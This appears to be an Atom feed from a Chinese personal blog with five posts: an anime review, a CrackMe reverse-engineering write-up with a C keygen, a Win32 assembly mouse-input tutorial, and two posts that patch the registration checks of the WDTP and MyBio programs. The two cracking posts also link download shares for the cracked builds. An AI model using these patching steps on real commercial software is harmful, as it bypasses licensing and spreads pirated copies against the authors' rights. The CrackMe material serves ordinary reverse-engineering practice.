<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  <subtitle>Python &amp; Hacker</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://hacktech.cn/"/>
  <updated>2018-04-27T13:35:55.931Z</updated>
  <id>http://hacktech.cn/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>made in abyss</title>
    <link href="http://hacktech.cn/2018/04/27/made-in-abyss.html"/>
    <id>http://hacktech.cn/2018/04/27/made-in-abyss.html</id>
    <published>2018-04-27T13:31:55.000Z</published>
    <updated>2018-04-27T13:35:55.931Z</updated>
    
    <content type="html"><![CDATA[<p>这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。</p>
<p>莉可的身世原来只是一个可以动的尸体，原来除咒之笼并不能抵抗深渊的诅咒。</p>
<p>其实可以细想，莉可在上升的过程中不断承受诅咒一次次的死亡。</p>
<p>在见到不动卿奥森的时候，奥森告诉了莉可这个残酷的事实，而却没有过多的对莉可心理进行描述，全是描写的奥森和累格，还真是无情呢。</p>
<p>我挺喜欢奥森这个人的，孤傲或者说傲娇。 </p>
<p>在巨人之杯，剧情画风急转而下，莉可的濒死是如此真实。</p>
<p>都说娜娜琪是老婆，其实我觉得娜娜琪这个人物挺可悲的，不是因为他的经历，当然他的经历是一部分，我觉得我觉得他可悲更多是他从来没有为过自己做过什么事情，一直活在期待之中。</p>
<p>另外，我想说一下，娜娜琪不是男孩子吗，为什么是老婆。</p>
<p>下一季应该会碰到黎明卿了，感觉他这个人挺黑暗的，不知道具体怎样。</p>
<p><img src="https://i.loli.net/2018/04/27/5ae3271829c4f.png" alt="860634.png"></p>
<p><img src="https://i.loli.net/2018/04/27/5ae32734151eb.png" alt="880846.png"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。&lt;/p&gt;
&lt;p&gt;莉可的身世原来只是一个可以动的尸体，原来除咒之笼并不能抵抗深渊的诅咒。&lt;/p&gt;
&lt;p&gt;其实可以细想，莉可在上升的过程中不断承受诅咒一次次的死亡。&lt;/
    
    </summary>
    
      <category term="anime" scheme="http://hacktech.cn/categories/anime/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="anime" scheme="http://hacktech.cn/tags/anime/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe第十九Brad Soblesky.2</title>
    <link href="http://hacktech.cn/2018/03/02/160CrackMe-019.html"/>
    <id>http://hacktech.cn/2018/03/02/160CrackMe-019.html</id>
    <published>2018-03-02T13:42:41.000Z</published>
    <updated>2018-04-10T13:45:47.683Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyrcq7eydj207004jgli.jpg" alt=""><br><a id="more"></a></p>
<p>查壳无壳，vc写的。  </p>
<p>我们输入假码后，然后点击，弹出错误框，直接打开od，对<code>MessageBoxA</code>下断点也行，寻找字符串也行。</p>
<p>一般的错误提示部分代码类似于这样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">call xxx</div><div class="line">test xxx,xxx</div><div class="line">je xxxerror</div><div class="line">...</div><div class="line">jmp xxx</div><div class="line">push xxx ;xxxerror</div><div class="line">...</div><div class="line"></div><div class="line">call error</div></pre></td></tr></table></figure></p>
<p>只需要往上找到关键跳直接nop就行。不过我们需要跟踪一下算法。</p>
<p>我们找到关键跳的<code>call</code>上方下断，可以看到他把一个东西压栈了，可以猜想是真码。</p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyroy9x6yj20zm0g1ae2.jpg" alt=""></p>
<p>然后我们测试一下111111和1643803416，提示正确，那我们找到这段的段首下断，然后f9运行程序重新输入假码点击Check。重点观察1643803416的出现地。</p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyrt7stnaj20wx0ecdj6.jpg" alt=""></p>
<p>我们可以看到在关键<code>call</code>的前方不远处就有出现，那么这个<code>add</code>前方的<code>call</code>是加密算法<code>call</code>吗？</p>
<p>显然不是的，我们可以看到这个<code>CString::Format</code>明显是对一个东西进行字符串格式化，格式是<code>%lu</code>(无符号长整数)，另外我们可以在它上面Enter跟一跟，可以发现直接从程序领空跳到系统领空了。所以我们可以猜测前面肯定是1643803416的一个什么数学形式然后用<code>%lu</code>格式化输出，我们可以推测是16进制，然后我们再重新来注意一下前面。</p>
<p>我们发现了1643803416的十六进制，在上方有个循环。其实之前在f8下来的时候，那个循环我们就可以推测是算法，现在经过分析可以更加肯定了。<code>mov eax,[local.4]</code>这个是这个循环最终跳出来的地方，那么<code>local.4</code>那里就是我们所需要找的东西。</p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foys1xvfuoj20rb0bwgnu.jpg" alt=""></p>
<p>在我们之前的两边跟中，我们可以测试发现<code>local.7</code>是你输入的Name的长度，<code>local.5</code>是我们输入的名字。</p>
<p>我们把上面的循环好好跟一遍。下面直接看我注释理解吧。对了，我们跟踪过程中也可以发现Name长度不能小于5，就在这个循环上方有个简单的判断。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">004015BE  |&gt; \C745 E0 00000&gt;mov [local.8],0x0</div><div class="line">004015C5  |.  EB 09         jmp short Brad_Sob.004015D0</div><div class="line">004015C7  |&gt;  8B55 E0       /mov edx,[local.8]</div><div class="line">004015CA  |.  83C2 01       |add edx,0x1</div><div class="line">004015CD  |.  8955 E0       |mov [local.8],edx                       ;  local8第一次进入循环为0，后续循环每次+1</div><div class="line">004015D0  |&gt;  8B45 E0        mov eax,[local.8]</div><div class="line">004015D3  |.  3B45 E4       |cmp eax,[local.7]                       ;  local7 = len(name)</div><div class="line">004015D6  |.  7D 42         |jge short Brad_Sob.0040161A             ;  当local8&gt;=len(name)跳出循环</div><div class="line">004015D8  |.  8B4D E0       |mov ecx,[local.8]</div><div class="line">004015DB  |.  51            |push ecx</div><div class="line">004015DC  |.  8D4D EC       |lea ecx,[local.5]                       ;  local5=name</div><div class="line">004015DF  |.  E8 1C030000   |call Brad_Sob.00401900                  ;  取name[local8]的十六进制ascii放入al</div><div class="line">004015E4  |.  0FBED0        |movsx edx,al</div><div class="line">004015E7  |.  8B45 F0       |mov eax,[local.4]                       ;  local4初始值为0x81276345</div><div class="line">004015EA  |.  03C2          |add eax,edx</div><div class="line">004015EC  |.  8945 F0       |mov [local.4],eax                       ;  local4 += name[local8]的十六进制</div><div class="line">004015EF  |.  8B4D E0       |mov ecx,[local.8]</div><div class="line">004015F2  |.  C1E1 08       |shl ecx,0x8</div><div class="line">004015F5  |.  8B55 F0       |mov edx,[local.4]</div><div class="line">004015F8  |.  33D1          |xor edx,ecx</div><div class="line">004015FA  |.  8955 F0       |mov [local.4],edx                       ;  local4 = (local8&lt;&lt;8)^local4</div><div class="line">004015FD  |.  8B45 E0       |mov eax,[local.8]</div><div class="line">00401600  |.  83C0 01       |add eax,0x1</div><div class="line">00401603  |.  8B4D E4       |mov ecx,[local.7]</div><div class="line">00401606  |.  0FAF4D E0     |imul ecx,[local.8]</div><div class="line">0040160A  |.  F7D1          |not ecx</div><div class="line">0040160C  |.  0FAFC1        |imul eax,ecx                            ;  eax = (~(len(name)*local8))*(local8+1)</div><div class="line">0040160F  |.  8B55 F0       |mov edx,[local.4]</div><div class="line">00401612  |.  0FAFD0        |imul edx,eax</div><div class="line">00401615  |.  8955 F0       |mov [local.4],edx                       ;  local4 *= eax</div><div class="line">00401618  |.^ EB AD         \jmp short Brad_Sob.004015C7</div><div class="line">0040161A  |&gt;  8B45 F0       mov eax,[local.4]</div></pre></td></tr></table></figure>
<p>相信结合我的注释自己细看一遍应该不太费力。下面直接写注册算法。其实上面的基本上用伪代码都写的比较明白了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// name为输入的第一个值 </span></div><div class="line">	<span class="keyword">char</span>* name = <span class="string">"111111"</span>;</div><div class="line">	<span class="keyword">int</span> len_name = <span class="built_in">strlen</span>(name);</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> (len_name&lt;<span class="number">5</span>)</div><div class="line">		<span class="comment">// name小于5出现提示并退出 </span></div><div class="line">		<span class="built_in">printf</span>(<span class="string">"User Name must have at least 5 characters.\n"</span>);</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">long</span> result = <span class="number">0x81276345</span>;</div><div class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len_name; i++)</div><div class="line">		&#123;</div><div class="line">			result += name[i];</div><div class="line">			result ^= (i&lt;&lt;<span class="number">8</span>);</div><div class="line">			result *= ~(len_name*i)*(i+<span class="number">1</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"result: %lu\n"</span>,result);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/c0264382gy1foyrcq7eydj207004jgli.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://hacktech.cn/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>MyBio小隐本记注册破解</title>
    <link href="http://hacktech.cn/2018/02/28/MyBio-Crack.html"/>
    <id>http://hacktech.cn/2018/02/28/MyBio-Crack.html</id>
    <published>2018-02-28T13:40:44.000Z</published>
    <updated>2018-04-10T13:41:58.092Z</updated>
    
    <content type="html"><![CDATA[<p>既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio</p>
<a id="more"></a>
<p>和WDTP的原理是差不多的，先把软件界面换成e文，然后写了15个记录后提示注册，一样的路子，直接跳过注册窗口的弹出就好了</p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fowhkbesvuj20b0088t8x.jpg" alt="注册窗口"></p>
<p>然后查壳一样是vs2015的无壳64位程序，直接附加到x64dbg，然后有了之前WDTP的经验，我们直接找弹出注册窗口的地方，查找字符串，然后搜索上图中<code>Serial-number:</code></p>
<p>一样的，找到了注册窗体生成的地方，在段首下个断，然后回溯一次，可以看到</p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fowhspimgmj20q507vgmx.jpg" alt=""></p>
<p>直接把这个call上方的jle改成jmp即可爆破。</p>
<hr>
<p>软件下载地址：</p>
<p><a href="https://share.weiyun.com/f5a48a92d8f458277e937dadc730a5ad" target="_blank" rel="external">密码：0yb0cz</a></p>
<p>解压后注意校验</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">大小: 4181504 字节</div><div class="line">文件版本: 2.1.1004</div><div class="line">修改时间: 2018年2月28日, 21:27:02</div><div class="line">MD5: EEA6B0BF010E45EA7EF340FFB543C316</div><div class="line">SHA1: BAA4BE7B3F2DE0F75996C0E9BE8DA0C177444CE8</div><div class="line">CRC32: 999277D5</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>WDTP注册破解</title>
    <link href="http://hacktech.cn/2018/02/26/WDTP-Crack.html"/>
    <id>http://hacktech.cn/2018/02/26/WDTP-Crack.html</id>
    <published>2018-02-26T12:34:50.000Z</published>
    <updated>2018-04-10T13:36:46.459Z</updated>
    
    <content type="html"><![CDATA[<p>今天来讲讲WDTP这个软件的破解。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。<br><a id="more"></a></p>
<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>之前这个软件是开源的，后来作者把它闭源了，然后加上了注册机制，我今天测试了一下，在我写了十多篇文章之后我再添加就提示我需要注册。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2567e65j20b0088t8y.jpg" alt=""><br>查一下壳，没有壳，64位的<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou25yvsaxj20ei074q3n.jpg" alt=""><br>直接附加到x64dbg中，然后我们搜索一下字符串serial，可以找到错误提示的地方。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou27t4wefj213q0fetcj.jpg" alt=""><br>我们反汇编窗口中下个断，我们可以看到上方的ret，说明提示错误信息是跳转进来的，然后我们在段首下好断，重新注册可以找到调用这里的地方<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2buv9phj20fs06qaay.jpg" alt=""><br>我们跟过去<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2d3h9nvj20hc02zt8z.jpg" alt=""><br>可以看到错误提示的call，这个call上方有一个jmp可以跳过，说明在前方应该有一个跳转跳过了这个jmp，直接跳到了这个错误提示call。我们再往前看一点。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2fedcjfj20m50chgnw.jpg" alt=""><br>我们可以看到上面的je，je前面的call是一个对比的call，爆破的话，我们不管这个，直接把je给nop掉。<br>然后我们执行，发现还是点击新建就会弹出来注册框，功能无法使用。<br>我们继续在字符串中找，可以看到窗口上面的Purchase，Question等等字符，可以发现错误提示的上面一段就是这个注册窗口弹出的一段，我们依旧在这个段的段首下段，然后找到调用它（弹注册窗）的地方。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2xb5dm0j20ia03lgm3.jpg" alt=""><br>它是直接jmp下来的，我们可以看到上面有一个call之后跟着一个test然后一个jne，我们可以猜想是你新建文档的时候先比对一下你是否注册，然后根据结果跳转，我们直接把jne改成jmp试试，让它直接跳过弹注册窗口。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou33aziswj209q054q2u.jpg" alt=""><br>完美，现在新建没问题了。</p>
<h2 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h2><p>所以我们只需要把它的这个弹注册窗的地方直接jmp过就好，我们在我们修改的命令上面右键补丁<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou352soi2j20ed0dbt90.jpg" alt=""><br>然后点击修复文件即可导出成一个破解版的exe。</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载后注意校验信息<br>文件信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">文件版本: 1.1.1004</div><div class="line">修改时间: 2018年2月26日, 19:40:44</div><div class="line">MD5: 5B8DF3D4572842376EA850B8551DEEED</div><div class="line">SHA1: B282AC870E4159A2ACEA389015FE4F4409A0F887</div><div class="line">CRC32: F51675CE</div></pre></td></tr></table></figure></p>
<p><a href="https://share.weiyun.com/5f8f4a09b5fb84f23479479e661b0c69" target="_blank" rel="external">密码：h7b4ru</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天来讲讲WDTP这个软件的破解。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(7)：鼠标输入消息</title>
    <link href="http://hacktech.cn/2018/02/09/Win32ASM7-Mouse-input-msg.html"/>
    <id>http://hacktech.cn/2018/02/09/Win32ASM7-Mouse-input-msg.html</id>
    <published>2018-02-09T14:29:19.000Z</published>
    <updated>2018-04-10T13:32:01.415Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>和处理键盘输入一样，WINDOWS将捕捉鼠标动作并把它们发送到相关窗口。这些活动包括左、右键按下、移动、双击、滚轮消息<code>WM_WHEEL</code>等。WINDOWS并不像处理键盘输入那样把所有的鼠标消息都导向有输入焦点的窗口，<strong>任何鼠标经过的窗口都将接收到鼠标消息，无论有否输入焦点</strong>。另外，窗口还会接收到鼠标在非客户区移动的消息（<code>WM_NCMOVE</code>），但大多数的情况下我们都会将其忽略掉。当鼠标在某窗口客户区移动时，该窗口将接收到<code>WM_MOUSEMOVE</code>消息。一个窗口若想处理<code>WM_LBUTTONDBCLK</code>或 <code>WM_RBUTTONDBCLK</code>，那么它的窗口类必须有<code>CS_DBLCLKS</code>风格，否则它就会接受到一堆的按键起落（<code>WM_XBUTTONDOWN</code>或<code>WM_XBUTTONUP</code>)的消息。 对于所有的消息，<strong>窗口过程函数传入的参数<code>lParam</code>包含了鼠标的位置，其中低位为x坐标，高位为y坐标</strong>，这些坐标值都是相对于窗口客户区的左上角的值，<code>wParam</code>中则包含了鼠标按钮的状态。 </p>
<h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line">.386 </div><div class="line">.model flat,stdcall </div><div class="line">option casemap:none </div><div class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </div><div class="line"></div><div class="line">include \masm32\include\windows.inc </div><div class="line">include \masm32\include\user32.inc </div><div class="line">include \masm32\include\kernel32.inc </div><div class="line">include \masm32\include\gdi32.inc </div><div class="line">includelib \masm32\lib\user32.lib </div><div class="line">includelib \masm32\lib\kernel32.lib </div><div class="line">includelib \masm32\lib\gdi32.lib </div><div class="line"></div><div class="line">.data </div><div class="line">ClassName db &quot;SimpleWinClass&quot;,0 </div><div class="line">AppName  db &quot;Our First Window&quot;,0 </div><div class="line">MouseClick db 0</div><div class="line"></div><div class="line">.data? </div><div class="line">hInstance HINSTANCE ? </div><div class="line">CommandLine LPSTR ? </div><div class="line">hitpoint POINT &lt;&gt; </div><div class="line"></div><div class="line">.code </div><div class="line">start: </div><div class="line">    invoke GetModuleHandle, NULL </div><div class="line">    mov    hInstance,eax </div><div class="line">    invoke GetCommandLine</div><div class="line">    mov CommandLine,eax </div><div class="line">    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT </div><div class="line">    invoke ExitProcess,eax </div><div class="line"></div><div class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </div><div class="line">    LOCAL wc:WNDCLASSEX </div><div class="line">    LOCAL msg:MSG </div><div class="line">    LOCAL hwnd:HWND </div><div class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </div><div class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </div><div class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </div><div class="line">    mov   wc.cbClsExtra,NULL </div><div class="line">    mov   wc.cbWndExtra,NULL </div><div class="line">    push  hInst </div><div class="line">    pop   wc.hInstance </div><div class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </div><div class="line">    mov   wc.lpszMenuName,NULL </div><div class="line">    mov   wc.lpszClassName,OFFSET ClassName </div><div class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </div><div class="line">    mov   wc.hIcon,eax </div><div class="line">    mov   wc.hIconSm,eax </div><div class="line">    invoke LoadCursor,NULL,IDC_ARROW </div><div class="line">    mov   wc.hCursor,eax </div><div class="line">    invoke RegisterClassEx, addr wc </div><div class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </div><div class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </div><div class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </div><div class="line">           hInst,NULL </div><div class="line">    mov   hwnd,eax </div><div class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </div><div class="line">    invoke UpdateWindow, hwnd </div><div class="line">    .WHILE TRUE </div><div class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </div><div class="line">                .BREAK .IF (!eax) </div><div class="line">                invoke DispatchMessage, ADDR msg </div><div class="line">    .ENDW </div><div class="line">    mov     eax,msg.wParam </div><div class="line">    ret </div><div class="line">WinMain endp </div><div class="line"></div><div class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </div><div class="line">    LOCAL hdc:HDC </div><div class="line">    LOCAL ps:PAINTSTRUCT </div><div class="line"></div><div class="line">    .IF uMsg==WM_DESTROY </div><div class="line">        invoke PostQuitMessage,NULL </div><div class="line">    .ELSEIF uMsg==WM_LBUTTONDOWN </div><div class="line">        mov eax,lParam </div><div class="line">        and eax,0FFFFh </div><div class="line">        mov hitpoint.x,eax </div><div class="line">        mov eax,lParam </div><div class="line">        shr eax,16 </div><div class="line">        mov hitpoint.y,eax </div><div class="line">        mov MouseClick,TRUE </div><div class="line">        invoke InvalidateRect,hWnd,NULL,TRUE </div><div class="line">    .ELSEIF uMsg==WM_PAINT </div><div class="line">        invoke BeginPaint,hWnd, ADDR ps </div><div class="line">        mov    hdc,eax </div><div class="line">        .IF MouseClick </div><div class="line">            invoke lstrlen,ADDR AppName </div><div class="line">            invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax </div><div class="line">        .ENDIF </div><div class="line">        invoke EndPaint,hWnd, ADDR ps </div><div class="line">    .ELSE </div><div class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam </div><div class="line">        ret </div><div class="line">    .ENDIF </div><div class="line">    xor    eax,eax </div><div class="line">    ret </div><div class="line">WndProc endp </div><div class="line">end start</div></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.ELSEIF uMsg==WM_LBUTTONDOWN </div><div class="line">    mov eax,lParam </div><div class="line">    and eax,0FFFFh </div><div class="line">    mov hitpoint.x,eax </div><div class="line">    mov eax,lParam </div><div class="line">    shr eax,16 </div><div class="line">    mov hitpoint.y,eax </div><div class="line">    mov MouseClick,TRUE </div><div class="line">    invoke InvalidateRect,hWnd,NULL,TRUE</div></pre></td></tr></table></figure>
<p>窗口过程处理了<code>WM_LBUTTONDOWN</code>消息，当接收到该消息时，<code>lParam</code>中包含了相对于窗口客户区左上角的坐标，我们把它保存下来，放到一个结构体变量（POINT）中，该结构体变量的定义如下： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">POINT STRUCT </div><div class="line">    x   dd ? </div><div class="line">    y   dd ? </div><div class="line">POINT ENDS</div></pre></td></tr></table></figure>
<p>然后我们把标志量<code>MouseClick</code>设为<code>TRUE</code>，这表明至少有一次在客户区的左键按下消息。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov eax,lParam </div><div class="line">and eax,0FFFFh </div><div class="line">mov hitpoint.x,eax</div></pre></td></tr></table></figure>
<p>由于<code>lParam</code>是一个32位长的数，其中高、低16位分别包括了y、x坐标所以我们做一些小处理，以便保存它们。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">shr eax,16 </div><div class="line">mov hitpoint.y,eax</div></pre></td></tr></table></figure>
<p>保存完坐标后我们设标志<code>MouseClick</code>为<code>TRUE</code>，这是在处理<code>WM_PAINT</code>时用来判断是否有鼠标左键按下消息。然后我们调用<code>InvalidateRect</code>函数迫使WINDOWS重新绘制客户区。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.IF MouseClick </div><div class="line">    invoke lstrlen,ADDR AppName </div><div class="line">    invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax </div><div class="line">.ENDIF</div></pre></td></tr></table></figure>
